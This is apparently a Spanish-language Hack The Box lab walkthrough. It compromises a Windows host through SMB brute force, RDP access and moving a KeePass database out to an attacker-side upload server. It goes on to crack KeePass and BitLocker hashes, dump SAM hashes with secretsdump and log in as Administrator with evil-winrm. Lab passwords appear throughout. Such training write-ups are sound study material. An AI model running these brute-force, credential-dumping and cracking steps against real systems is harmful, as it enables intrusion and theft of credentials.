--- 
title: "Laboratorio de Ataques de Contraseña - Díficil"  
date: 2025-06-02
tags: [hackthebox, smb, rdp, keepass, webshell, bitlocker, vhd, dislocker, evilwinrm]
categories: ["Hack The Box", "Password Cracking"]
summary: "Este laboratorio se centra en el compromiso de una máquina Windows a través del abuso de credenciales, fuerza bruta sobre SMB y RDP, extracción y crackeo de un archivo KeePass, y montaje de una imagen VHD protegida por BitLocker. Se aplican técnicas de post-explotación para obtener hashes de cuentas y acceso como Administrator mediante Evil-WinRM."
draft: false 

---
#### Enunciado
El siguiente host es un cliente basado en Windows. Al igual que en las evaluaciones anteriores, nuestro cliente desea asegurarse de que un atacante no pueda acceder a ningún archivo confidencial en caso de un ataque exitoso. Mientras nuestros compañeros estaban ocupados con otros hosts de la red, descubrimos que el usuario `Johanna` está presente en muchos hosts. Sin embargo, aún no hemos podido determinar el motivo exacto de esto.

De entrada nos están dando un posible usuario, más adelante vemos donde lo podemos usar.

#### **Enumeración de puertos**
Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.
```bash
nmap -p- -sS --min-rate 2000 -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap1.png)
Vemos que tenemos los puertos 111, 135, 139, 445, 2049, 3389, 5985, etc, abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.
```bash
nmap -p22,111,135,139,445,2049,3389,5985,47001,49664,49668 -sCV -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap2.png)
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/nmap3.png)

Donde vemos que el Nombre de la Máquina es WINSRV, nos da una versión de Windows de 10.0.17763.
Empezamos a enumerar servicios y nos encontramos que en en el puerto 445 con el usuario que nos dieron al principio `johanna` y la lista de password mutada con las custom rules. 
Hacemos un ataque de fuerza bruta sobre ese servicio de la siguiente forma:


```bash
crackmapexec smb <IP> -u johanna -p /.../mut_password.list
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/crackmapexec1.png)

Listamos la información del servidor con las credenciales:
```bash
smbclient -L //10.129.67.26/ -U Johanna
#password
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient1.png)

Vemos que hay un recurso `david` el cual intentamos listar pero con el usuario `johanna` no tenemos los permisos para ver nada.

Con las credenciales del usuario `johanna` podemos acceder por `rdp` a su escritorio
```bash
xfreerdp3  /v:<IP> /u:johanna /p:'1231234!' 
```

Y vemos que en el directorio Documents hay un archivo del keepass, nos lo copiamos para local para trabajarlo más cómodo.
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp.png)

Nos vamos a instalar una herramienta para montar un servidor web sencillo y subir el archivo desde windows a nuestra máquina Linux.

```bash
python3 -m pip install uploadserver
python3 -m uploadserver
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp1.png)
Nos lo instalamos así y procedemos a usarlo:
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp2.png)
En la máquina windows ponemos en el navegador `http://<IP>:8000` accedemos a la primera opción (File Upload) y subimos el archivo.

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp3.png)
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp4.png)

Luego vamos al directorio donde nos descarga el archivo y le ejecutamos el siguiente comando para intentar crackear la contraseña.
```bash
keepass2john Logins.kdbx > keepas.hash
```

```bash
john --wordlist=/.../mut_password.list keepas.hash
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/john1.png)

Procedemos a entrar al archivo Logins.kdbx 

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/xfreerdp5.png)

Tenemos `david:gRzX7YbeTcDG7`

Recordemos que en el puerto 445 esta corriendo un smb donde hay un recurso llamado david al que ahora podemos intentar acceder

```bash
smbclient //<IP>/david -U david --option='client min protocol=SMB2'
#Password
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/smbclient2.png)

Y vemos que tenemos un archivo backup.vhd
Nos lo bajamos para trabajarlo en local(se demora un poco en bajarse porque pesa como 130 mb)

Ahora con la herramienta bitlocker2john vamos a extraer los hashes para intentar crackearlos con las wordlists posteriormente.

```bash
bitlocker2john -i Backup.vhd > backup.hashes
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker1.png)

Dentro de los hashes seleccionamos el de `bitlocker`:

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker2.png)

Procedemos a crackear el hash con la `mut_password`

```bash
hashcat -m 22100 backup.hash /.../mut_password.list -o backup.cracked
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker3.png)

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker4.png)

Vamos a montar el Backup.vhd como un dispositovo de almacenamiento para intentar acceder a los datos que en el se almacenan.
```bash
sudo losetup --partscan --find --show Backup.vhd
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup1.png)
Luego vemos que en slot 5 esta la partición de datos donde debe estar la información.

```bash
mmls Backup.vhd
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup2.png)
Desbloqueamos el disco utilizando la contraseña que crakeamos:
```bash
sudo dislocker -V /dev/loop9p2 -u123456789! -- /mnt/bitlocker
```

Montamos el volumen que `dislocker` crea:

```bash
mkdir /mnt/bitlocker
mkdir /mnt/bitlocker_mount
sudo mount -o loop /mnt/bitlocker/dislocker-file /mnt/bitlocker_mount
```

Y vemos su contenido:
```bash
ls /mnt/bitlocker_mount
```
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/backup3.png)

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/bitlocker5.png)

Copiamos la linea de administrator para una archivo yo le puse adm.hash y le pasamos el john para crackerar el hash

```bash
john --wordlist=/.../mut_passwd.list adm.hash --format=NT
```

![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd.png)

Ya con las credenciales de Administrator podemos usar evilwinrm y acceder a la flag.

```bash
evil-winrm -i <IP> -u Administrator
#Password
```

Y nos movemos al directorio indicado.
![](../../../../../images/HTB_modulos/password_atk_htb_labs_3/administrator_passwd2.png)


Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.

